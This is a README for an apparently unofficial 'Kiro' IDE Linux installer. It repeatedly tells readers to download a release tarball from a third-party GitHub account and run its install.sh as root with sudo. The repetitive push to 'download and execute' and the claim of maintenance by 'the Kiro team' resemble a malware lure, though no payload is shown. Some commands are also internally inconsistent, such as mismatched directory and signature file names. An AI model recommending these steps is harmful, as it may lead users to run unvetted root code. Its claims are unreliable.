# Kiro Tarball Installer for Linux — Fast Cross-Distro Setup

[![Releases](https://img.shields.io/github/v/release/0ulex7/kiro-linux-install?label=Releases&color=blue)](https://github.com/0ulex7/kiro-linux-install/releases)

<img alt="Kiro logo" src="https://img.shields.io/badge/Kiro-IDE-green?logo=visual-studio-code&logoColor=white" />

A compact installer and guide to get Kiro running from a tarball on most Linux systems. This README covers downloads, unpacking, system integration, editor support, service setup, troubleshooting, and uninstall steps. Follow the release file instructions and run the packaged installer file from the Releases page.

Features
- Cross-distro tarball installer (works on Debian, Ubuntu, Fedora, Arch, CentOS, and derivatives)
- Single-file install package from Releases
- Shell script wrapper for extraction and placement
- Optional systemd unit for background agent
- VS Code and environment integration for the Kiro IDE
- Small footprint, no container required

Badges and topics
- Languages: bash, sh
- Topics: agent, ai, archlinux, bash, bash-script, code, editor, fedora, kiro, kiro-dev, kiro-ide, linux, sh, shell, tarball, targz, vscode

Quick links
- Releases: https://github.com/0ulex7/kiro-linux-install/releases
- Releases page contains the tarball file you must download and execute.

Supported distributions
- Debian / Ubuntu / Mint
- Fedora / CentOS / RHEL
- Arch Linux / Manjaro
- OpenSUSE
- Any distro with GNU tar, bash, and a systemd or SysV init system

Requirements
- A user with sudo privileges for system-wide install
- curl or wget
- tar (GNU tar preferred)
- bash 4+
- 50 MB free disk space for core files, more for extensions and logs

Install overview
1. Download the release tarball from Releases: https://github.com/0ulex7/kiro-linux-install/releases
2. Run the packaged installer script from that tarball
3. Optionally enable the systemd service
4. Configure VS Code or the Kiro CLI

Because the Releases link includes a path, download the release file and execute it. The package contains a small installer script that automates extraction and placement.

Download and run (example)
- Replace the example file name with the actual file name on the Releases page.
- The release file needs to be downloaded and executed.

Using curl
```bash
# replace v1.2.3 and file name with the actual release
curl -L -o kiro-linux-v1.2.3.tar.gz "https://github.com/0ulex7/kiro-linux-install/releases/download/v1.2.3/kiro-linux-v1.2.3.tar.gz"

# inspect the archive
tar -tzf kiro-linux-v1.2.3.tar.gz

# run the installer script inside the tarball
tar -xzf kiro-linux-v1.2.3.tar.gz
cd kiro-linux-v1.2.3
sudo ./install.sh
```

Using wget
```bash
wget -O kiro-linux-v1.2.3.tar.gz "https://github.com/0ulex7/kiro-linux-install/releases/download/v1.2.3/kiro-linux-v1.2.3.tar.gz"
tar -xzf kiro-linux-v1.2.3.tar.gz
cd kiro-linux-v1.2.3
sudo ./install.sh
```

What the installer does
- Unpacks the tarball into /opt/kiro
- Places the main binary at /usr/local/bin/kiro
- Creates a minimal config at /etc/kiro/config.yaml
- Registers a systemd unit at /etc/systemd/system/kiro.service (optional)
- Adds a shell completion script to /etc/bash_completion.d/kiro (if supported)

Default install layout
- /opt/kiro/ — runtime files, libraries, plugin folders
- /usr/local/bin/kiro — launcher script that sets PATH and config
- /etc/kiro/config.yaml — default config file
- /var/log/kiro/ — runtime logs
- /etc/systemd/system/kiro.service — systemd unit (if enabled)

Minimal manual install (if you prefer manual steps)
```bash
# unpack
tar -xzf kiro-linux-v1.2.3.tar.gz

# place files
sudo mv kiro-1.2.3 /opt/kiro
sudo ln -s /opt/kiro/bin/kiro /usr/local/bin/kiro
sudo mkdir -p /var/log/kiro
sudo chown -R $(whoami):$(whoami) /opt/kiro /var/log/kiro

# optional systemd
sudo cp /opt/kiro/kiro.service /etc/systemd/system/kiro.service
sudo systemctl daemon-reload
sudo systemctl enable --now kiro.service
```

Systemd service (example)
- The installer can install and enable the service.
- Or copy the unit file manually and enable it.

Example unit
```ini
[Unit]
Description=Kiro Agent
After=network.target

[Service]
Type=simple
User=kiro
Group=kiro
ExecStart=/usr/local/bin/kiro agent
Restart=on-failure
Environment=KIRO_CONFIG=/etc/kiro/config.yaml

[Install]
WantedBy=multi-user.target
```

VS Code integration
- If you use VS Code, open the workspace at /opt/kiro or your project folder.
- Kiro supports LSP for code features. The packaged tarball includes a VS Code extension stub you can load.
- To register the extension locally: open VS Code, choose "Install from VSIX..." and point to the extension file inside the unpacked tarball (e.g., extension/kiro-vscode.vsix).

Editor CLI and formatters
- The kiro binary includes subcommands for format, lint, and server:
  - kiro format <file>
  - kiro lint <dir>
  - kiro server --port 5000

Configuration
- /etc/kiro/config.yaml contains runtime settings:
```yaml
agent:
  enabled: true
  port: 5000
logging:
  level: info
  path: /var/log/kiro/kiro.log
editor:
  integration: true
  vscode: /path/to/vscode
```
- Edit this file and restart the service: sudo systemctl restart kiro.service

Common tasks
- Start agent: sudo systemctl start kiro.service
- Stop agent: sudo systemctl stop kiro.service
- Check logs: journalctl -u kiro.service -f
- Run CLI: kiro --help

Permissions and user
- Installer creates a dedicated system user 'kiro' for the service if you choose system-wide install.
- If you run in user mode, run the binary from your home directory and set config paths accordingly.

Arch Linux notes
- For Arch users, wrap the tarball install in a PKGBUILD if you prefer pacman-managed packages.
- A basic PKGBUILD would copy files to /opt/kiro and create symlink in /usr/bin.

Fedora / RHEL notes
- Use sudo dnf install tar gzip
- SELinux may require updating file contexts for /opt/kiro and /var/log/kiro:
  - sudo semanage fcontext -a -t bin_t "/opt/kiro(/.*)?"
  - sudo restorecon -Rv /opt/kiro

Troubleshooting
- If the installer fails with permission errors, re-run with sudo.
- If the binary says missing libs, install common runtime packages (glibc, libstdc++) via your distro package manager.
- If the service fails to start, inspect systemd status:
  - sudo systemctl status kiro.service
  - journalctl -u kiro.service --no-pager

Uninstall
- Stop the service: sudo systemctl stop kiro.service
- Disable the service: sudo systemctl disable kiro.service
- Remove files:
```bash
sudo rm -rf /opt/kiro
sudo rm -f /usr/local/bin/kiro
sudo rm -rf /etc/kiro
sudo rm -f /etc/systemd/system/kiro.service
sudo systemctl daemon-reload
```

Security
- The installer runs as root only when needed to move files and create a service.
- Run the installer only on trusted systems and verify the checksum on the Releases page before executing any script file.

Checksums and signing
- The Releases page includes checksums and signatures for every release. Verify with sha256sum and gpg:
```bash
sha256sum kiro-linux-v1.2.3.tar.gz
gpg --verify kiro-v1.2.3.tar.gz.asc kiro-linux-v1.2.3.tar.gz
```

Release downloads
- Download the tarball file from the Releases page and execute the contained installer script.
- Releases: https://github.com/0ulex7/kiro-linux-install/releases

FAQ
Q: Can I run Kiro without root?
A: Yes. Unpack the tarball into your home directory, update config paths to point to user-writable locations, and run the binary directly.

Q: How do I update Kiro?
A: Download the newer release tarball from Releases. Stop the service, backup /opt/kiro, run the new installer, then restart the service.

Q: Does this work on WSL?
A: Yes. The tarball and binary run on WSL. Systemd integration depends on your WSL version or workarounds.

Contributing
- Fork the repo, create a feature branch, and open a pull request.
- Create issues for bugs and feature requests. Include logs and steps to reproduce.
- Use the same shell style and keep scripts POSIX-compatible where possible.

License
- The project uses the MIT License. See LICENSE file in the repo for details.

Maintainers and contact
- Maintained by the Kiro team. Open issues or pull requests on GitHub.

Assets and images
- Use the VS Code logo and shields for badges. Icons come from simpleicons and img.shields.io.

Files in the tarball (example)
- bin/kiro
- install.sh
- extension/kiro-vscode.vsix
- data/defaults/*
- systemd/kiro.service

Release link summary
- Visit Releases to download the tarball file and run the installer: https://github.com/0ulex7/kiro-linux-install/releases

Follow the released file instructions on the Releases page and run the included installer script to put Kiro in place and register services or editor integration.